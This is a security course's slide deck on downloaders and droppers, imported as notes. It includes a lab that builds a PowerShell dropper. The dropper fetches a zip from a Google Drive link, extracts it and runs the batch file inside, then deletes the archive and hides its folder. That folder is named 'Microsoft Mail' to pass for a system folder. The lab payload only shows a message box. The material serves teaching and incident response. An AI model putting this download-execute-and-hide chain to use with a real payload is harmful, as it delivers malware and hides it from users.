---
title: "26강_down_drop_v1.2"
type: "acs-advance-pdf"
course: "ACS Advanced"
course_folder: "Incident Response"
source_path: "E:\\ProJect\\ACS File\\advance\\Incident Response\\26강_down_drop_v1.2.pdf"
source_size_bytes: 1087578
source_modified: 2025-11-12T12:50:43
imported_at: 2026-06-14T14:26:44
tags:
  - acs
  - acs-advanced
  - imported
---

# 26강_down_drop_v1.2

- Source: [26강_down_drop_v1.2.pdf](file:///E:/ProJect/ACS%20File/advance/Incident%20Response/26%EA%B0%95_down_drop_v1.2.pdf)

> Imported from PDF for Obsidian search. Verify formatting against the original file when exact layout matters.

## Page 1

Downloader & Dropper
• What is Downloader?
• Downloader
• What is a Dropper?
• Dropper
26
1

## Page 2

What is Downloader?01
1
2
What is Downloader
• The purpose of which is to download some data,
program, etc. over a network
• A program or script used to download files or
data from a remote server
Benefits and drawbacks
Benefits
For automated and remote file management
Drawbacks
If the downloaded data or program is malicious or
malware for further attacks
Downloader
2

## Page 3

Benefits
Leverage automation
Downloader scripts allow you to automate and schedule file downloads
Reduce repetitive manual tasks and improve work efficiency
Regularly update and manage your data
Benefits of using scripts
Scripts allow you to add more functionality, such as downloading files at a specific time, performing additional actions after download, and more
Can run in a variety of environments (Windows, Linux or MacOS with Powershell)
Downloader scripts can be customized and extended to meet your needs, allowing you to perform file download tasks for a variety of purposes
and environments
What is Downloader?01
Remote file management
Downloader scripts make it easy to transfer files from remote servers to local systems
Regularly download backups of data stored on cloud servers to local systems
Script runs in the background without user intervention, allowing you to focus on other tasks
3

## Page 4

Drawbacks
Downloading malware
Downloaders are used to download malicious code directly from the Internet and inject it into a user's system
When included as part of malicious code, the downloader, when executed, downloads additional malicious code from a
specified URL and executes it
Bypassing security solutions
Downloaders are effective at bypassing security solutions because they don't perform malicious activity on their own
Downloaders don't directly contain malicious code, but act as a way to download and execute malicious code from a
remote server
What is Downloader?01
Persistent activity
Continuously downloads and executes malicious code, continuously attacking your system
Continues to download and execute additional malicious code even after it is removed or stopped from the user's system,
continuing to weaken the system's security and enabling additional malicious activity
4

## Page 5

What is Downloader?02
$url = "https://drive.usercontent.google.com/u/0/uc?id=1Wa7c8BES4CzQcJTemDde9oZEMx79ycq3&export=download"
$dest = “$env:\Desktop\a.txt"
$client = New-Object System.net.webclient
$client.DownloadFile($url, $dest)
Download File : ZKEEEEEE.txt
Simple Downloader
Download Target
$url: Path to the file to download
$dest: location and name to save the file to
$client = create and download web client object
Flow
Provides the ability to download or upload data
using $HTTP or FTP protocols
System.Net.WebClient
5

## Page 6

Run the script
File download complete
Verify files
Hello
Hi
Downloader02
6

## Page 7

1
2
What is dropper
Role in delivering and executing other malicious
code to the system
Features
• Droppers themselves often exhibit no malicious
behavior, making them effective at bypassing
security systems
• However, when executed, they infect systems
by "dropping" more dangerous malicious code
Dropper
What is a Dropper?03
7

## Page 8

1 . S y s t e m  P e n e t r a t i o n
Hidden in an unsuspicious file and installed on the
system by a dropper when the user opens or
downloads the file
Emails, attachments, software, etc.
2 . D r o p  &  E x e c u t e
Installing malicious code with the goal of taking control of
your system or stealing your information
Different types of malicious code, such as ransomware,
spyware, adware, etc.
Installed and executed in a specific location on your
systemUsually installed in a place where users can't easily
find it
PenetrationExecute
Droppers like these are used in conjunction with Trojans or other forms of malware to allow attackers to infect and take cont rol of a
system
Usually use a variety of techniques to bypass security systems, such as antivirus or firewalls
Once a dropper has infiltrated a system, it "drops" and executes a Trojan horse or other malicious code, which allows the attacker to
perform malicious actions, such as taking control of a user's system or stealing personal information
What is a Dropper?03
8

## Page 9

DROPPER LAB
01
STEP
03
STEP02
STEP
Create a file to
download Execute
Creating
Droppers
What is a Dropper?03
9

## Page 10

Batch script
Compression
Print a message box that says
fake_malware
Command
Msg * fake_malware
Act
Detection evasion :
Enables solutions to avoid detection by hiding patterns or signatures
Capacity reduction :
Reduce the size of the malware so it can be delivered quickly or stored in a limited space
Increased complexity :
The process of analyzing involves understanding the code, which can be made more complex through
compression
Multi-stage attacks :
A compromise can be executed in multiple stages, acting innocently while compressed and then
triggering the malware when the trigger is activated
Why?
What is a Dropper?03
10

## Page 11

Right-click Act.zip -> share -> share
Upload to Google Drive
• Select Anyone with the link
• Anyone with the link can access and download
the file
Shared settings
What is a Dropper?03
11

## Page 12

Select a Open in new window
Double-click Act.zip
Click Download in the top right corner
Download
What is a Dropper?03
12

## Page 13

When you enter this URL into the address bar, the file is
downloaded immediately
Save URL
Confirm that it has been downloaded to the Download
directory on your PC
Verify downloads
What is a Dropper?03
13

## Page 14

Internet connection -> Create base directory -> Download -> Extract -> Hide
Configuring Droppers
Dropper04
14

## Page 15

function Test-InternetConnection {
    param ( [string]$URL = 'https://www.google.com' )
    try {
        $WebRequest = [System.Net.WebRequest]::Create($URL)
        $WebResponse = $WebRequest.GetResponse()
        if ($WebResponse.StatusCode -eq 200) { Write-Output "[+] Internet Connection Established - File Download Available" }
        else { Write-Output "[-] Internet Connection Failed - File Download Not Available" }
    }
    catch { Write-Output "[-] Error Checking Internet Connection: $_" }
    finally {
        if ($WebResponse) { $WebResponse.Close() }
    }
}
Check your internet connection
• Define a function called 'Test-InternetConnection', the function has one parameter, which is the URL to test
• Determine what activity to perform via try-catch
• Create a $WebRequest variable, create a web request object for the given URL, and save it
• If the response has a status code of 200 (normal response), print that the internet connection is good, if the status code is not 200, print that
the internet connection failed
• If there is an error along the way, print the error [-] Error Checking Internet Connection:
• Finally, if the web response object is non-null, close it to release the resource using finally
Function descriptions
Dropper04
15

## Page 16

function Create-BaseDirectory {
    $directoryPath = "C:\Program Files\Microsoft Mail"
    if (!(Test-Path -Path $directoryPath)) {
        New-Item -Force -ItemType directory -Path $directoryPath
        Write-Output "[+] Base Directory Created"
    } else {
        Write-Output "[!] Base Directory Already Exists"
    }
}
Create a base directory
• Define a function named 'Create-BaseDirectory’
• Save the path to create the directory in the variable 'directoryPath’
• Test-Path' is a built-in function in PowerShell that checks to see if the specified path exists, and the '!' is a logical negation operator, which means that this
conditional statement means "if directoryPath does not exist“
• If the directory does not exist, it creates the directory and prints Base Directory Created
• If the directory already exists, print Base Directory Already Exists
Function descriptions
• The base directory mentioned here is the directory where the
malware will be downloaded and where most of the process will
take place
• A folder called Microsoft Mail is not normally there, but if it starts
with Microsoft, users may assume it is system related, or a folder that
may be on the computer in the first place.
• If it's named Danger_directory or something like
Malware_base_directory, the user is likely to be suspicious
Base Directory?
Dropper04
16

## Page 17

function Downlaod-File{
    $url1 = "https://drive.usercontent.google.com/u/1/uc?id=1jZ76P7jiONUv_wzh-1-kk0Vf0Yc3Qttr&export=download"
    $dest1 = "C:\Program Files\Microsoft Mail\act.zip"
    $client = New-Object System.net.webclient
    $client.DownloadFile($url1, $dest1)
    Write-Output "[+] Success Download"
}
Download the file
• Define a function named 'Download-File’
• Store the URL to download the file in variable 'url1', which is the download URL of the zip file you uploaded to Google Drive
• Save the path to save the downloaded file in the variable 'dest1’
• I use the path "C:\Program Files\Microsoft Mail\act.zip“
• Once downloaded, save it under the Base Directory with the name act.zip
• Create a web client object and save it in the 'client' variable and use that web client object to download the file from 'url1' and save it in the path specified in
'dest1’
• Output Success Download when the file is downloaded successfully
Function descriptions
Dropper04
17

## Page 18

Add-Type -AssemblyName System.IO.Compression.FileSystem
function Unzip{
    param([string]$zipfile, [string]$outpath)
    [System.IO.Compression.ZipFile]::ExtractToDirectory($zipfile, $outpath)
}
Decompress
• Load the 'System.IO.Compression.FileSystem' assembly into your script
• Define a function named Unzip
• Enter the path to save the compressed file to be decompressed and the PATH to save the decompression output
• Use the 'ExtractToDirectory' method of the 'System.IO.Compression.ZipFile' class to extract the compressed file specified in 'zipfile' to the path specified in
'outpath'
Function descriptions
• System.IO.Compression.FileSystem is one of the class libraries in the .NET Framework that provides compression and decompression functionality for file systems
• Zip File
Provides functions for creating compressed files and reading items within compressed files
Main Methods :  CreateFromDirectory, ExtractToDirectory, Open, OpenRead
• Zip File Extensions
Class provides methods to extract individual items within a compressed file via a ZipArchiveEntry object, or to create individual items within a compressed file
from a stream
• Main Methods : ExtractToFile, CreateEntryFromFile
System.IO.Compression.FileSystem
Dropper04
18

## Page 19

function Hide-Action{
    Remove-Item -Path "C:\Program Files\Microsoft Mail\act.zip"
    $End_Task = Get-Item "C:\Program Files\Microsoft Mail\" -Force
    $End_Task.Attributes = "Hidden"
    Write-Output "[+] Success Hide_Action"
}
Stealth & Concealment
• Define a function called Hide-Action
• Use Remove-Item to delete an item (in this case, a file) in the specified path
• Define a variable called $End_Task that gets the directory entry in the base
directory, C:\Program Files\Microsoft Mail\, and changes the property of
that entry to Hidden
• The '-Force' option includes entries that are read-only or hidden
• When you're done, print [+] Success Hide_Action
Function descriptions
Create-BaseDirectory
Test-InternetConnection
Downlaod-File
unzip_file "C:\Program Files\Microsoft Mail\act.zip" "C:\Program Files\Microsoft mail\Act"
start-Process "C:\Program Files\Microsoft mail\Act\action.bat"
Hide-Action
Calling functions
• First, create a base directory, check your internet connection, and
download the file
• Unzip the downloaded zip file and run action.bat inside the zip file
• Run the Hide-Action function to cover your tracks
Calling functions
Dropper04
19

## Page 20

Launch Screen Hidden Directories
Delete Act.zip
Dropper04
20
